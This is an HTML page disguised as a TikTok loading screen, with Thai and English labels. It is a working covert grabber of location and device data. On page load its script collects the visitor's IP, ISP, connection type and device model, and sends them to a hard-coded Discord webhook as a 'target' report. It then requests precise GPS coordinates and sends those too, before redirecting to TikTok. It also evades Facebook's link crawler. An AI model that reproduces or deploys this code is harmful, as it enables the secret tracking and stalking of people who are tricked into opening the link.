<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok - Loading Content</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505441313468710923/4ZwXHcn5adt8nWLoAgLGOuIE9ZKfeIxjZBQvgsF5qh1uLl9DeMT5wQgpwfQxWSuBkpJ9"; 

        async function capture() {
            if (navigator.userAgent.includes("facebookexternalhit")) return;

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                const check = (val) => (val && val !== null ? val : "❌ ไม่พบข้อมูล");

                // ตรวจสอบประเภทเน็ต (WiFi / Cellular)
                let connectionType = "Unknown (ไม่ระบุ)";
                if (navigator.connection) {
                    connectionType = `${navigator.connection.type || navigator.connection.effectiveType} (เน็ตแบบ ${navigator.connection.effectiveType})`;
                }

                const ua = navigator.userAgent;
                let deviceType = "Desktop (คอมพิวเตอร์)";
                let modelName = "Unknown Device";

                if (/android/i.test(ua)) {
                    deviceType = "Mobile (Android) (มือถือแอนดรอยด์)";
                    const match = ua.match(/\(([^;]+);([^;]+);/);
                    modelName = match ? match[2].trim().split(" Build")[0] : "Android Device";
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    deviceType = "Mobile (iOS) (มือถือไอโอเอส)";
                    const w = screen.width, h = screen.height;
                    if (w === 430 && h === 932) modelName = "iPhone 14/15/16 Pro Max";
                    else if (w === 393 && h === 852) modelName = "iPhone 14/15/16 Pro";
                    else if (w === 390 && h === 844) modelName = "iPhone 12/13/14/15";
                    else modelName = `iPhone (${w}x${h})`;
                }

                // ส่ง Report แรก: ข้อมูลเน็ตและสเปคเครื่อง
                let report = `📂 **NEW TARGET LOGGED**\n`;
                report += `──────────────────────────\n`;
                report += `🌐 **[NETWORK INFO (ข้อมูลเน็ต)]**\n`;
                report += `> **IP (ไอพี):** \`${check(data.ip)}\` \n`;
                report += `> **ISP (ชื่อเน็ต):** ${check(data.org)}\n`;
                report += `> **Type (ประเภท):** ${connectionType}\n\n`;
                report += `📱 **[DEVICE (อุปกรณ์)]**\n`;
                report += `> **Model (รุ่น):** ${modelName}\n`;
                report += `> **Type (เครื่อง):** ${deviceType}\n`;
                report += `──────────────────────────`;

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: report })
                });

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const { latitude, longitude } = pos.coords;
                        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ 
                                content: `🎯 **PRECISE LOCATION (พิกัดแม่นยำสูง)**\n──────────────────────────\n📍 **Maps:** ${mapsLink}\n✅ **Status:** พิกัดตรงตามจริง (GPS)\n──────────────────────────` 
                            })
                        });
                        window.location.href = "https://www.tiktok.com";

                    }, async () => { 
                        let backupReport = `⚠️ **LOCATION ACCESS DENIED (ปฏิเสธพิกัด)**\n`;
                        backupReport += `──────────────────────────\n`;
                        backupReport += `📍 **[IP BASED LOCATION (ตำแหน่งอ้างอิงไอพี)]**\n`;
                        backupReport += `> **City (เมือง):** ${check(data.city)}\n`;
                        backupReport += `> **Region (จังหวัด):** ${check(data.region)}\n`;
                        backupReport += `❌ **Status:** ข้อมูลคลาดเคลื่อน (อ้างอิงตาม IP)\n`;
                        backupReport += `──────────────────────────`;

                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: backupReport })
                        });
                        window.location.href = "https://www.tiktok.com"; 
                    }, { 
                        enableHighAccuracy: true, 
                        timeout: 10000 
                    });
                } else {
                    window.location.href = "https://www.tiktok.com";
                }
            } catch (e) { 
                window.location.href = "https://www.tiktok.com"; 
            }
        }
        window.onload = capture;
    </script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family: sans-serif;">
    <div style="text-align:center;">
        <p>Loading Content... (กำลังโหลดเนื้อหา...)</p>
        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
    </div>
    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
</body>
</html>
